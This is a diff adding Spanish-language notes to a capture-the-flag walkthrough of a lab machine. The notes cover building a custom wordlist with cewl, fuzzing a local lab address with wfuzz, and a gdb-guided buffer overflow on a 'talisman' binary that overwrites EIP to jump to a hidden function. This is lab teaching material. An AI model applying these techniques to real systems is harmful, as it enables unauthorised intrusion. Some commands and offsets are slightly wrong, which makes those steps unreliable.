@@ -149,8 +149,84 @@ a@b:~# foremost [IMAGEN.JPG]
 
 flag3{9ad3f62db7b91c28b68137000394639f} - Cross the chasm at /amagicbridgeappearsatthechasm 345465869
 
+>> Nota: Para más análisis es posible el uso de:
+
+a@b:~# binwalk -B magicbook.jpg
 
 >> Nota: lanzo dirbuster, no encuentro nada con un diccionario de rutas estandar. 
+
+a@b:~# cewl — depth 0 -m 4 -w magic.txt -v http://www.d20srd.org/indexes/magicItems.htm
+a@b:~# cat magic.txt | sort | uniq > magit.txt
+a@b:~# cat magit.txt > tr A-Z a-z > thing.txt
+
+
+>> Nota: Creación de diccionario personalizado. Descarga de palabras a traves de una web, ordenado de a a-z y se quitan los repes
+Se deja en minusculas y como resultado thing.txt
+
+>> Nota: FUZZ otra vez contra la web, coge el fichero, descarta los 404 contra la web
+
+a@b:~# wfuzz -c -z file,thing.txt — hc 404 http://192.168.56.102
+
+00692: C=200 9 L 109 W 9676 Ch “talisman”
+
+
+>> Nota: talisman devuelve 200, es un binario. Analisis de binario, uso de file, strings, binwalk y gdb
+
+
+a@b:~# gdb talisman
+a@b:~# info functions
+0x08048529  wearTalisman
+0x08048a13  main
+0x08048a37  chantToBreakSpell
+
+>> Nota: No lo puedo correr con el comando run porque no tengo la arquitectura adecuada, me dice no encuentra el binario ejecutable
+y me da error 127, pero mirando es basico, el binario pregunta tu responde y no ocurre nada, te pones a escribir más caracteres
+y peta, un bufferoverflow, comandos importantes con python, pinta 32 carácteres A y se lo pasa al binario
+
+a@b:~# python -c ‘print “A”*32’ | ./talisman
+
+>> Nota: 32 caracteres A imprimidos: Pete con error SIGSEGV, que es por invasión de espacios de memoria.
+
+a@b:~# (gdb) r
+Starting program: /root/necromancer/talisman aaaaa
+You have found a talisman.
+
+The talisman is cold to the touch, and has no words or symbols on it’s surface.
+
+Do you want to wear the talisman? AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+Nothing happens.
+
+Program received signal SIGSEGV, Segmentation fault.
+0x08048a0e in wearTalisman ()
+
+>> Nota: Pete con 36 caracteres A como vemos a pisado en donde da el error, 0x41414141 in ?? () 41 es caracter A, por lo que 
+estamos pisando el EIP, que es el regitro de instrucción, donde se almacena la instrucción que se está ejecutando, por lo que 
+podemos sobreescribir ese puntero para que apunte a donde nosotros queramos: 0x08048a37  chantToBreakSpell, esta función es la
+que importa: 08048a37, se traduce a little endian addressing: Este formato es adoptado por la mayoría de procesadores Intel. Al 
+igual que existen lenguajes donde la lectura y escritura puede ser izquierda-derecha o derecha-izquierda también en el mundo de 
+los ordenadores puede suceder algo parecido. por lo que lo traducimos con una herramienta online:
+
+https://www.scadacore.com/tools/programming-calculators/online-hex-converter/
+
+y nos da algo tal que así: \x37\x8a\x04\x08, eso es igual a 08048a37, pintamos 32 A y \x37\x8a\x04\x08, y nos pega el salto
+
+
+
+(gdb) r 
+Starting program: /root/necromancer/talisman 
+You have found a talisman.
+
+The talisman is cold to the touch, and has no words or symbols on it’s surface.
+
+Do you want to wear the talisman? AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+Nothing happens.
+
+Program received signal SIGSEGV, Segmentation fault.
+0x41414141 in ?? ()
+(gdb)
+
 
 
 
